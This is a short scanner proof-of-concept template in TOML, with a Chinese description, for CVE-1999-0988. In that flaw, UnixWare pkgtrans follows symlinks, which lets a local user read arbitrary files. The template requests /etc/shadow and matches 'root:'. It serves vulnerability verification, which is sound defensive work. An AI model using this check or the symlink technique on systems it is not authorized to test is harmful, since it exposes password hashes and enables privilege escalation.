[info]
author = "ave"
description = "UnixWare pkgtrans 工具在处理软件包时未对符号链接进行充分校验，本地低权限用户可通过构造指向 /etc/shadow 等敏感文件的符号链接，诱导 pkgtrans 以更高权限读取并输出目标文件内容，从而验证本地任意文件读取漏洞的存在。"
id = "POC-AVE-1999-0819"
name = "CVE-1999-0988 UnixWare pkgtrans 符号链接任意文件读取 PoC"
severity = "high"
tags = ["ave-1999-0819"]
vuln_id = [
    "CVE-1999-0988",
    "AVE-1999-0819",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
